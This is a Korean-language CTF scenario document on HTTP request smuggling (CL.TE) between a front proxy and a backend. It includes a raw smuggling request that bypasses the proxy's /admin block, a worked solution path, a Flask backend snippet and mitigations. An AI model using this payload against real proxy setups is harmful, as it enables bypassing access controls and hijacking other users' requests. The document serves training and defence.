---
title: HTTP Request Smuggling (CL.TE) — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, request-smuggling, proxy, cl-te, network-security]
confidence: high
---

# HTTP Request Smuggling (CL.TE) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Proxy Pass (프록시 패스 서비스)
- **난이도**: High
- **핵심 컨셉**: 웹 서버 인프라의 전반적인 처리 불일치를 이용하는 대표적 고급 기법인 **HTTP 요청 스머글링(HTTP Request Smuggling)** 문제입니다. 프론트엔드 리버스 프록시(예: HAProxy/Nginx)와 백엔드 웹 서버(예: Node.js/Gunicorn)로 이루어진 다중 계층 아키텍처 환경이 주어집니다. 프록시 서버는 `Content-Length(CL)` 헤더를 기준으로 패킷의 크기를 결정하여 요청을 큐(Queue)에 담아 전달하는 반면, 백엔드 서버는 `Transfer-Encoding(TE)` 헤더를 더 우선시하여 해석(CL.TE 취약 패턴)합니다. 공격자는 이를 이용해 백엔드 파서로 전송되는 TCP 스트림 내에 미완성된 두 번째 요청(Smuggled Request)을 끼워 넣어 다음 일반 사용자의 요청 흐름을 변조하거나 보호된 `/admin` 경로를 호출합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend Proxy**:
  - `Transfer-Encoding: chunked` 헤더를 지원하며 백엔드와 HTTP Keep-Alive 연결을 재사용합니다.
  - 외부에서 직접 접근 가능한 `/` 및 일반 조회 경로 노출. `/admin` 경로는 프록시 단에서 접속 IP가 차단되어 차단됨.
- **Backend Web Server**:
  - 프록시가 가중해 전송해 주는 HTTP 스트림 수신.
  - 내부 로컬 및 보호 구역 처리 API 보유.
- **Flag 위치**:
  - `/admin/flag` (백엔드 로컬 혹은 특정 스머글링 경로 조회 성공 시 반환).

### 2.2 취약점 지점
1. **Inconsistent Request Parsing (CL.TE)**:
   - 두 계층(Proxy - Backend) 간에 HTTP 데이터 전송 크기를 판별하는 로직의 기준 불일치입니다.
   - 프록시는 `Content-Length`만 신뢰해 페이로드를 통째로 전송하는 한편, 백엔드는 `Transfer-Encoding` 청크가 끝나면 즉시 해당 요청이 끝난 것으로 보고 나머지 잉여 바이트를 다음 번 연결 요청 스트림의 맨 앞에 병합해 버립니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|------------|--------|------|---------|---------|------|
| `/` | GET/POST | 없음 | HTTP Raw 패킷 스트림 | 웹페이지 응답 | 외부 노출 경로 |
| `/admin/flag`| GET | 프록시 차단 | 없음 | 플래그 결과 | 직접 접근 시 403 Forbidden 반환 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. CL.TE 취약점 탐색
패킷 조작 도구(Burp Suite Repeater 또는 netcat)를 이용해 억지로 CL과 TE를 동시에 명시하고 청크의 길이가 불일치하는 페이로드를 날려서 타임아웃이나 비정상 상태 코드가 오는지 체크합니다.

### Step 2. 스머글링 패킷 구성
공격자는 프록시의 방어 정책(예: 외부인 대상 `/admin` 호출 불가)을 우회하고 백엔드 단에서 `/admin/flag` 요청이 수행되도록 스트림을 밀어 넣습니다.
- **CL.TE 공격용 Raw Request 설계**:
  ```http
  POST / HTTP/1.1
  Host: proxy.challenge.local
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 139
  Transfer-Encoding: chunked

  0

  GET /admin/flag HTTP/1.1
  Host: 127.0.0.1
  X-Ignore: X
  ```
  *(주의: 개행 및 청크 크기 `0`이후의 `GET /admin/flag` 문자열이 스머글링될 타겟 요청입니다. `Content-Length` 값 139는 전체 바디 크기만큼 설정되어 프록시는 이를 하나의 요청으로 보고 백엔드에 밀어 넣습니다.)*

### Step 3. 백엔드 스트림 오염 분석
1. **프록시의 판별**: `Content-Length: 139`에 의해 전체 패킷을 백엔드로 넘깁니다.
2. **백엔드의 판별**: `Transfer-Encoding: chunked`가 우선하므로 body의 청크 사이즈인 `0`이 나오는 지점에서 첫 번째 요청이 정상 완료된 것으로 해석하고 프론트에 응답합니다.
3. **나머지 잉여분**: 꼬리표로 붙어있던 아래 문자열이 백엔드 내부 TCP 입력 버퍼에 남아 다음 요청을 기다립니다.
   ```http
   GET /admin/flag HTTP/1.1
   Host: 127.0.0.1
   X-Ignore: X
   ```

### Step 4. 다음 요청과의 바인딩 및 플래그 획득
공격자가 바로 두 번째 요청(아무 일반 요청)을 동일 커넥션 또는 다음 대기열 커넥션으로 전송합니다.
- *두 번째 요청 전송*:
  ```http
  GET /index.html HTTP/1.1
  Host: proxy.challenge.local
  ```
- *백엔드의 수신 조합*:
  버퍼에 대기 중이던 공격자의 스머글링 문장과 두 번째 요청의 앞부분이 하나로 합쳐집니다:
  ```http
  GET /admin/flag HTTP/1.1
  Host: 127.0.0.1
  X-Ignore: XGET /index.html HTTP/1.1
  Host: proxy.challenge.local
  ```
- *결과*: 백엔드는 프록시를 거치지 않고 다이렉트로 로컬에서 `/admin/flag` 요청이 발생한 것으로 인식하게 되어, 403 차단 필터를 무력화하고 플래그 문자열(`FLAG{http_req_smuggling_cl_te_bypass}`)을 반환합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python/Gunicorn 취약 버전)

```python
# 백엔드가 실행 중인 WSGI 환경 (Gunicorn v19.x 등의 취약 버전 동작)
# 프론트 프록시는 HTTP/1.1 Keep-Alive 커넥션으로 들어오는 패킷의 CL(Content-Length)을 
# 검증하여 통과시키지만 백엔드는 TE(Chunked)를 해석하는 미스매치 시나리오

# backend/app.py
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/")
def index():
    return "Welcome to Backend Services!"

@app.route("/admin/flag")
def get_admin_flag():
    # 프록시는 외부에서 들어오는 /admin/flag 요청에 대해 IP 차단을 적용하고 있지만,
    # 백엔드 입장에서 스머글링된 요청은 프록시가 보낸 내부 연결 통로에서 
    # 독립된 정상 요청 스트림인 것처럼 파싱되어 실행됩니다.
    return jsonify({
        "status": "success",
        "flag": "FLAG{http_req_smuggling_cl_te_bypass}"
    })

if __name__ == "__main__":
    # 백엔드는 프록시 뒤에 숨어 있음
    app.run(host="127.0.0.1", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **프록시 단의 이중 헤더 거부 및 정규화**:
   - `Content-Length`와 `Transfer-Encoding` 헤더가 동시에 존재하는 요청이 들어오면 규격을 위반한 잘못된 요청으로 분류해 400 Bad Request 에러로 즉각 드롭시킵니다.
2. **HTTP/2, HTTP/3 도입**:
   - HTTP/1.1의 텍스트 기반 요청 직렬화 방식을 지양하고, 바이너리 프레임 단위를 기반으로 통신 길이를 정확히 인코딩하여 전송하는 HTTP/2 이상 규격을 네트워크 인프라에 전용 적용합니다.
3. **재사용 커넥션 비활성화**:
   - 프록시와 백엔드 간의 백채널 통신 시 동일 소켓 연결을 멀티플렉싱 방식으로 재사용하지 않고, 요청 시마다 연결을 생성 및 끊어내어(Connection: Close) 요청 혼선 가능성을 물리적으로 차단합니다.
